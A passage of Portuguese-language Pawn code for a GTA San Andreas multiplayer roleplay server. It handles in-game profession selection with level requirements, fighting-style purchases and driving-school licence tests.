	 			case 6:
				{
					if(pInfo[playerid][Prof] == CONTRABANDISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um Contrabandista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 130)
	                {
	                    SendClientMessage(playerid, COR_CONTRABANDISTA, "Parabéns, você agora é um(a) Contrabandista!");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = CONTRABANDISTA;
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 130 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 7:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_OUTRA)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
				{
					if(pInfo[playerid][Prof] == MEDICO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Médico(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 25)
	                {
	                    SendClientMessage(playerid, COR_MEDICO, "Parabéns, você agora é um(a) Médico(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MEDICO;
	                    SetPlayerColor(playerid, COR_MEDICO);
                   		SetPlayerSkin(playerid, 275);
		                format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		                WE_SetInt(gFile, "Skin", 275);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 25 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 1:
				{
					if(pInfo[playerid][Prof] == ADVOGADO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Advogado(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 60)
	                {
	                    SendClientMessage(playerid, COR_ADVOGADO, "Parabéns, você agora é um(a) Advogado(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = ADVOGADO;
	                    SetPlayerColor(playerid, COR_ADVOGADO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 60 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	   			case 2:
				{
					if(pInfo[playerid][Prof] == BOMBEIRO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Bombeiro(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 120)
	                {
	                    SendClientMessage(playerid, COR_PADRE, "Parabéns, você agora é um(a) Bombeiro(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = BOMBEIRO;
	                    SetPlayerColor(playerid, COR_BOMBEIRO);
                   		SetPlayerSkin(playerid, 279);
		                format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		                WE_SetInt(gFile, "Skin", 279);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 120 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 3:
				{
					if(pInfo[playerid][Prof] == INSTRUTOR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Instrutor(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 40)
	                {
	                    SendClientMessage(playerid, COR_INSTRUTOR, "Parabéns, você agora é um(a) Instrutor(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = INSTRUTOR;
	                    SetPlayerColor(playerid, COR_INSTRUTOR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 40 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
                case 4:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_OUTR2)
	{
        if(response)
        {
	        switch(listitem)
	        {
              	case 0:
				{
					if(pInfo[playerid][Prof] == PESCADOR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Pescador(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_PESCADOR, "Parabéns, você agora é um(a) Pescador(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PESCADOR;
	                    SetPlayerColor(playerid, COR_PESCADOR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					/*else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 5 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}*/
				}
				case 1:
				{
					if(pInfo[playerid][Prof] == PIZZABOY)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Pizza Boy/Girl!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_PIZZABOY, "Parabéns, você agora é um(a) Pizza Boy/Girl.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PIZZABOY;
	                    SetPlayerColor(playerid, COR_PIZZABOY);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
				}
				case 2:
				{
					if(pInfo[playerid][Prof] == FOTOGRAFO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Fotografo(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_FOTOGRAFO, "Parabéns, você agora é um(a) Fotografo(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = FOTOGRAFO;
	                    SetPlayerColor(playerid, COR_FOTOGRAFO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
				}
				case 3:
				{
					if(pInfo[playerid][Prof] == MECANICO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Mecânico(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 20)
	                {
	                    SendClientMessage(playerid, COR_MECANICO, "Parabéns, você agora é um(a) Mecânico(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MECANICO;
	                    SetPlayerColor(playerid, COR_MECANICO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 20 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 4:
				{
					if(pInfo[playerid][Prof] == FRENTISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Frentista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 50)
	                {
	                    SendClientMessage(playerid, COR_FRENTISTA, "Parabéns, você agora é um(a) Frentista.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = FRENTISTA;
	                    SetPlayerColor(playerid, COR_FRENTISTA);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 50 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 5:
				{
					if(pInfo[playerid][Prof] == PROSTITUTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Flanelinha!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 10)
	                {
	                    SendClientMessage(playerid, COR_PROSTITUTA, "Parabéns, você agora é um(a) Prostituta.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PROSTITUTA;
	                    SetPlayerColor(playerid, COR_PROSTITUTA);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 10 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 6:
				{
					if(pInfo[playerid][Prof] == PADRE)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Flanelinha!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 50)
	                {
	                    SendClientMessage(playerid, COR_PADRE, "Parabéns, você agora é um Padre.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PADRE;
	                    SetPlayerColor(playerid, COR_PADRE);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 50 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 7:
				{
					if(pInfo[playerid][Prof] == REPORTER)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Repórter!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 25)
	                {
	                    SendClientMessage(playerid, COR_REPORTER, "Parabéns, você agora é um(a) Repórter.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = REPORTER;
	                    SetPlayerColor(playerid, COR_REPORTER);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 25 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	  			case 8:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_ISPAW)
	{
	    if(pInfo[playerid][fardado] == 1)
	    {
	        SetPlayerArmour(playerid, 0.0);
	    	SetPlayerSkin(playerid, WE_GetInt(f(playerid), "Skin"));
	    	pInfo[playerid][fardado] = 0;
	    	pInfo[playerid][ccolete] = 0;
	    }
	    if(FireAtual[playerid] > 0)
		{
			new ID = playerid;
			DestroyDynamicObject(FireObj[ID]);
			FireCreated[ID] = 0;
			FirePlayer[ID] = "Ninguém";
			FirePos[ID][0] = 0, FirePos[ID][1] = 0, FirePos[ID][2] = 0;
			Delete3DTextLabel(FireText[ID]);
			FireAtual[playerid] = 0;
			RemovePlayerMapIcon(playerid, 90);
		}
		if(response)
		{
		    SendClientMessage(playerid, AZUL_WE, "Você optou por spawnar em sua profissão. Dúvidas, use: /Profissao.");
			SpawnProf(playerid); SetColor(playerid); ResetPlayerWeapons(playerid); armasProf(playerid);
		}
		else
		{
		    SendClientMessage(playerid, VERMELHO_WE, "Você optou por não spawnar em sua profissão. Dúvidas, use: /Profissao.");
			SetColor(playerid); ResetPlayerWeapons(playerid); armasProf(playerid);
		}
		return 1;
	}
	if(dialogid == D_LUTAS)
	{
        if(response)
        {
	        switch(listitem)
	        {
	     		case 0: // Boxe
				{
				    if(WE_GetInt(gFile, "Luta") == 1)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) lutador(a) de Boxe!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
				    }
				    if(GetPlayerCash(playerid) < 1000)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Para mudar sua seu tipo de luta é preciso ter uma quantia de R$1000!");
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
				        return 1;
				    }
				    else
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Agora seu modo de lutar é Boxe.");
	                    sGivePlayerCash(playerid, -500);
	                    WE_SetInt(gFile, "Luta", 1);
	      				SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
	      				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	      				return 1;
					}
				}
	      		case 1: // KongFu
				{
				    if(WE_GetInt(gFile, "Luta") == 2)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) lutador(a) de Kung Fu!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
				    }
				    if(GetPlayerCash(playerid) < 1000)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Para mudar sua seu tipo de luta é preciso ter uma quantia de R$1000!");
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
				        return 1;
				    }
				    else
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Agora seu modo de lutar é Kung Fu.");
	                    sGivePlayerCash(playerid, -700);
	                    WE_SetInt(gFile, "Luta", 2);
	      				SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
	      				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	      				return 1;
					}
				}
	      		case 2: // Briga de Rua
				{
				    if(WE_GetInt(gFile, "Luta") == 3)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) lutador(a) de Rua!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
				    }
				    if(GetPlayerCash(playerid) < 1000)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Para mudar sua seu tipo de luta é preciso ter uma quantia de R$1000!");
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
				        return 1;
				    }
				    else
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Agora seu modo de lutar é Briga de Rua.");
	                    sGivePlayerCash(playerid, -300);
	                    WE_SetInt(gFile, "Luta", 3);
	      				SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
	      				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	      				return 1;
					}
				}
	      		case 3: // Agarra e Chuta
				{
				    if(WE_GetInt(gFile, "Luta") == 4)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já possui esse estilo de luta!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
				    }
				    if(GetPlayerCash(playerid) < 1000)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Para mudar sua seu tipo de luta é preciso ter uma quantia de R$1000!");
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
				        return 1;
				    }
				    else
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Agora seu modo de lutar é Agarrar e Chutar.");
	                    sGivePlayerCash(playerid, -400);
	                    WE_SetInt(gFile, "Luta", 4);
	      				SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
	      				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	      				return 1;
					}
				}
	    		case 4: // Normal
				{
				    if(WE_GetInt(gFile, "Luta") == 5)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) lutador(a) Normal!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
				    }
				    if(GetPlayerCash(playerid) < 1000)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Para mudar sua seu tipo de luta é preciso ter uma quantia de R$1000!");
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
				        return 1;
				    }
	              	else
				  	{
					  	SendClientMessage(playerid, COR_AMARELO, "Agora seu modo de lutar é Normal.");
		             	sGivePlayerCash(playerid, -50);
		            	WE_SetInt(gFile, "Luta", 5);
		      			SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
		      			PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
		      			return 1;
					}
				}
			}
		}
	}
	if(dialogid == D_AUTOE){
		if(response){
			switch(listitem){
				case 0:{//Aerea
					ShowPlayerDialog(playerid, D_TERRESTRE, DIALOG_STYLE_LIST, "Terrestre",
					"Moto - {3DB134}$750,00\nCarro - {3DB134}$1,200\nCaminhão - {3DB134}$2,000\nTrem - {3DB134}$1,000", "Fazer Teste", "Sair");
				}case 1:{//Nautica
					ShowPlayerDialog(playerid, D_NAUTICA, DIALOG_STYLE_LIST, "Nautica",
					"Barco - {3DB134}$7,000", "Fazer Teste", "Sair");
				}case 2:{//Aerea
				    ShowPlayerDialog(playerid, D_AEREA, DIALOG_STYLE_LIST, "Aerea",
				    "Helicóptero - {3DB134}$15,000\nAvião - {3DB134}$30,000", "Fazer Teste", "Sair");
				}
			}
		}
	}
	if(dialogid == D_TERRESTRE)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
					if(pInfo[playerid][HabTMoto] == 0)
					{
	                	if(GetPlayerCash(playerid) < 750)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$750)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLAMOTO,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de motos!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de motos!");
						return 1;
					}
				}
	            case 1:
	            {
					if(pInfo[playerid][HabTCarro] == 0)
					{
	                	if(GetPlayerCash(playerid) < 1200)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$1.200)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLACARRO,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de carros!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de carros!");
						return 1;
					}
				}
	            case 2:
	            {
					if(pInfo[playerid][HabTCaminhao] == 0)
					{
					    if(GetPlayerCash(playerid) < 2000)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$2.000)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLACAMINHAO,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de caminhões!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de caminhões!");
						return 1;
					}
				}
	            case 3:
	            {
	                if(pInfo[playerid][HabTTrem] == 1)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você já possui habilitação para pilotagem de trens!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 1000)
	                {
						SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$1.000)");
						return 1;
					}
					SendClientMessage(playerid, COR_AMARELO, "Você adquiriu uma habilitação terrestre para trens.");
					pInfo[playerid][HabTTrem] = 1;
					sGivePlayerCash(playerid, -1000);
					WE_SetInt(f(playerid), "HabTTrem", 1);
					return 1;
	            }
			}
		}
	}
	if(dialogid == D_NAUTICA)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
					if(pInfo[playerid][HabNBarco] == 0)
					{
                    	if(GetPlayerCash(playerid) < 7000)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$7.000)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLABARCO,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de barcos!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de barcos!");
						return 1;
					}
				}
			}
		}
	}
	if(dialogid == D_AEREA)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
					if(pInfo[playerid][HabAHeli] == 0)
					{
                        if(GetPlayerCash(playerid) < 15000)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$15.000)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLAHELI,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de helicópteros!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de helicópteros!");
						return 1;
					}
				}
	            case 1:
	            {
					if(pInfo[playerid][HabAAviao] == 0)
					{
                        if(GetPlayerCash(playerid) < 30000)
	                	{
							SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente! (Necessário: R$30.000)");
							return 1;
						}
						ShowPlayerDialog(playerid,D_AUTOESCOLAAVIAO,DIALOG_STYLE_MSGBOX,"Auto Escola","Confirme se deseja iniciar seu teste para pilotagem de aviões!","Sim","Nao");
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO,"Você já possui habilitação para pilotagem de aviões!");
						return 1;
					}
				}
	        }
		}
	}
	if(dialogid == D_AUTOESCOLAMOTO)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
			Checks6[playerid] = 0;
            InAutoEscola[playerid] = 1;
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            carroauto[playerid] = CreateVehicle(581, 1616.3485,-1132.6362,23.6333,297.6633,0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar a moto para não ser reprovado!");
            SetPlayerRaceCheckpoint(playerid,0,AutoPoints[0][0], AutoPoints[0][1], AutoPoints[0][2],AutoPoints[1][0], AutoPoints[1][1], AutoPoints[1][2], 7);
            Checks[playerid] = 1;
            GivePlayerCash(playerid, -750);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_AUTOESCOLACARRO)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
			Checks6[playerid] = 0;
            InAutoEscola2[playerid] = 1;
			new rand = random(sizeof(SCars));
            carroauto2[playerid] = CreateVehicle(410, SCars[rand][0], SCars[rand][1], SCars[rand][2], SCars[rand][3],0,0, -1);
            SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            PutPlayerInVehicle(playerid, carroauto2[playerid], 0);
            SendClientMessage(playerid,COR_AMARELO,"Tente não danificar o carro para não ser reprovado!");
            SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[0][0], AutoPoints2[0][1], AutoPoints2[0][2],AutoPoints2[1][0], AutoPoints2[1][1], AutoPoints2[1][2], 7);
            Checks2[playerid] = 1;
            GivePlayerCash(playerid, -1200);
            return 1;
        }
        if(response == 0)
        {
            SendClientMessage(playerid,COR_ERRO,"Voce desistiu do teste, por tanto foi reprovado.");
            return 1;
        }
    }
	if(dialogid == D_AUTOESCOLACAMINHAO)
    {
        if(response == 1)
        {
			Checks[playerid] = 0;
			Checks2[playerid] = 0;
			Checks3[playerid] = 0;
			Checks4[playerid] = 0;
			Checks5[playerid] = 0;
